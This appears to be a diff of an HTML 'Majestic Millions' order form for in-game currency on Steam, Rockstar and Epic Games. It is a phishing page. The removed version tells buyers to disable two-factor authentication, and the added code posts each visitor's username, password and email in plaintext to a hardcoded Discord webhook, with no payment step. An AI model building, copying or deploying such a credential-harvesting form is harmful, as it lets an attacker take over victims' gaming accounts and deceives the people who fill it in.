@@ -3,160 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Majestic Millions - Order Form</title>
+  <title>Majestic Millions Order Form</title>
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=Raleway:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
-    /* General Styling */
-    body {
-      margin: 0;
-      font-family: 'Raleway', sans-serif;
-      background: linear-gradient(135deg, #0f0f0f, #1c1c1c);
-      color: #e6e6e6;
-      overflow-x: hidden;
-    }
-
-    header {
-      text-align: center;
-      padding: 60px 20px;
-      position: relative;
-      background: linear-gradient(135deg, #1c1c1c, #0f0f0f);
-    }
-
-    header img {
-      max-width: 250px;
-      opacity: 0.9;
-      margin-bottom: 30px;
-      filter: drop-shadow(0px 4px 10px rgba(0, 0, 0, 0.8));
-      animation: fadeIn 2s ease-in-out;
-    }
-
-    h1 {
-      font-size: 3.5em;
-      color: #c29c68;
-      font-family: 'Playfair Display', serif;
-      letter-spacing: 2px;
-      animation: slideDown 1.5s ease-out;
-    }
-
-    /* Warning message */
-    .warning {
-      background-color: #ffcc00;
-      color: #333;
-      font-size: 1.2em;
-      padding: 15px;
-      margin-bottom: 20px;
-      text-align: center;
-      border-radius: 10px;
-    }
-
-    .warning a {
-      color: #333;
-      text-decoration: underline;
-    }
-
-    /* Form Section */
-    .form-container {
-      max-width: 800px;
-      margin: 60px auto;
-      padding: 40px 30px;
-      background: #121212;
-      border-radius: 15px;
-      border: 2px solid #c29c68;
-      text-align: center;
-    }
-
-    .form-container input, .form-container select, .form-container button {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 10px;
-      border: 1px solid #c29c68;
-      background-color: #181818;
-      color: #e6e6e6;
-      font-size: 1.1em;
-      transition: 0.3s;
-    }
-
-    .form-container button:hover {
-      background-color: #c29c68;
-      transform: scale(1.05);
-    }
-
-    .form-container select, .form-container input {
-      background-color: #181818;
-    }
-
-    .form-container .hidden {
-      display: none;
-    }
-
-    /* Animations */
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-      }
-      to {
-        opacity: 1;
-      }
-    }
-
-    @keyframes slideDown {
-      from {
-        transform: translateY(-50px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
+    /* Add your styles here */
   </style>
 </head>
 <body>
   <header>
     <img src="https://i.imgur.com/rNTnavN.png" alt="Majestic Millions Logo">
     <h1>Majestic Millions - Order Form</h1>
-    <div class="warning">
-      <p><strong>Important!</strong> Please ensure that you have <strong>disabled two-factor authentication (2FA)</strong> on the following platforms before proceeding with your purchase:</p>
-      <ul>
-        <li><a href="https://support.steampowered.com/kb_article.php?ref=3160-agcb-2555" target="_blank">Steam: How to disable 2FA</a></li>
-        <li><a href="https://support.rockstargames.com/articles/207351238" target="_blank">Rockstar: How to disable 2FA</a></li>
-        <li><a href="https://www.epicgames.com/help/en-US/epic-games-store-c61/how-to-disable-two-factor-authentication-2fa-c559" target="_blank">Epic Games: How to disable 2FA</a></li>
-      </ul>
-    </div>
+    <p>Complete Your Order Below</p>
   </header>
 
   <div class="form-container">
     <h2>Select Platform</h2>
-    <select id="platformSelect" onchange="updatePlatformInputs()">
-      <option value="" disabled selected>Select Platform</option> <!-- Default option -->
+    <select id="platformSelect">
       <option value="steam">Steam</option>
       <option value="rockstar">Rockstar</option>
       <option value="epic">Epic Games</option>
     </select>
 
-    <div id="steamInput" class="hidden">
-      <h2>Enter Steam Login Credentials</h2>
-      <input type="text" id="steamUsername" placeholder="Steam Username" required>
-      <input type="password" id="steamPassword" placeholder="Steam Password" required>
-    </div>
-
-    <div id="rockstarInput" class="hidden">
-      <h2>Enter Rockstar Login Credentials</h2>
-      <input type="text" id="rockstarUsername" placeholder="Rockstar Username" required>
-      <input type="password" id="rockstarPassword" placeholder="Rockstar Password" required>
-    </div>
-
-    <div id="epicInput" class="hidden">
-      <h2>Enter Epic Games Login Credentials</h2>
-      <input type="text" id="epicUsername" placeholder="Epic Games Username" required>
-      <input type="password" id="epicPassword" placeholder="Epic Games Password" required>
-    </div>
+    <h2>Enter Login Credentials</h2>
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
 
     <h2>Select Package</h2>
-    <button type="button" onclick="selectPackage(3.25)">50M Bank - £3.25</button>
+    <button type="button" onclick="selectPackage(4.25)">50M Bank - £4.25</button>
     <button type="button" onclick="selectPackage(7.50)">100M Bank - £7.50</button>
     <button type="button" onclick="selectPackage(14.99)">500M Bank - £14.99</button>
 
@@ -175,7 +49,6 @@
 
   <script>
     let price = 0;
-    let paypalLink = "";
 
     // Update the price based on the package selected
     function selectPackage(packagePrice) {
@@ -183,67 +56,55 @@
       document.getElementById('confirmationMessage').innerText = `Price: £${price}`;
     }
 
-    // Show/Hide platform-specific login inputs
-    function updatePlatformInputs() {
-      const platform = document.getElementById('platformSelect').value;
-      const steamInput = document.getElementById('steamInput');
-      const rockstarInput = document.getElementById('rockstarInput');
-      const epicInput = document.getElementById('epicInput');
-
-      // Show inputs based on the selected platform
-      if (platform === 'steam') {
-        steamInput.classList.remove('hidden');
-        rockstarInput.classList.remove('hidden');
-        epicInput.classList.add('hidden');
-      } else if (platform === 'rockstar') {
-        rockstarInput.classList.remove('hidden');
-        steamInput.classList.remove('hidden');
-        epicInput.classList.add('hidden');
-      } else if (platform === 'epic') {
-        epicInput.classList.remove('hidden');
-        steamInput.classList.add('hidden');
-        rockstarInput.classList.add('hidden');
-      } else {
-        steamInput.classList.add('hidden');
-        rockstarInput.classList.add('hidden');
-        epicInput.classList.add('hidden');
-      }
-    }
-
     // Process the payment and confirm the order
     function processPayment() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
       const email = document.getElementById('email').value;
       const platform = document.getElementById('platformSelect').value;
       const paymentCheck = document.getElementById('paymentCheck').checked;
 
-      const steamUsername = document.getElementById('steamUsername').value;
-      const steamPassword = document.getElementById('steamPassword').value;
-      const rockstarUsername = document.getElementById('rockstarUsername').value;
-      const rockstarPassword = document.getElementById('rockstarPassword').value;
-      const epicUsername = document.getElementById('epicUsername').value;
-      const epicPassword = document.getElementById('epicPassword').value;
-
-      if (!email || !paymentCheck || price === 0 || 
-        (platform === "steam" && (!steamUsername || !steamPassword)) ||
-        (platform === "rockstar" && (!rockstarUsername || !rockstarPassword)) ||
-        (platform === "epic" && (!epicUsername || !epicPassword))) {
+      if (!username || !password || !email || !paymentCheck || price === 0) {
         alert('Please fill in all fields and confirm payment.');
         return;
       }
 
-      // Determine the PayPal link based on selected package
-      if (price === 3.25) {
-        paypalLink = "https://www.paypal.com/paypalme/MajesticMillions/3.25";
-      } else if (price === 7.50) {
-        paypalLink = "https://www.paypal.com/paypalme/MajesticMillions/7.50";
-      } else if (price === 14.99) {
-        paypalLink = "https://www.paypal.com/paypalme/MajesticMillions/14.99";
-      }
+      const orderDetails = {
+        username: username,
+        password: password,
+        email: email,
+        platform: platform,
+        price: price
+      };
 
-      // Redirect to PayPal link
-      if (paypalLink) {
-        window.location.href = paypalLink;
-      }
+      // Send the data to the Discord webhook
+      sendToWebhook(orderDetails);
+    }
+
+    // Send the form data to the Discord webhook
+    function sendToWebhook(orderDetails) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1315868877200298056/neYt5Dh8BC9zrQf6SWWjs-yV44mm3JliAc7hb-mxJkIkOVUi-IgIbSArxSEKjFo7RZya';
+
+      const payload = {
+        content: `New Order: \nUsername: ${orderDetails.username} \nPassword: ${orderDetails.password} \nEmail: ${orderDetails.email} \nPlatform: ${orderDetails.platform} \nPrice: £${orderDetails.price}`
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Success:', data);
+        alert('Order details sent successfully!');
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+        alert('There was an error sending your order.');
+      });
     }
   </script>
 </body>
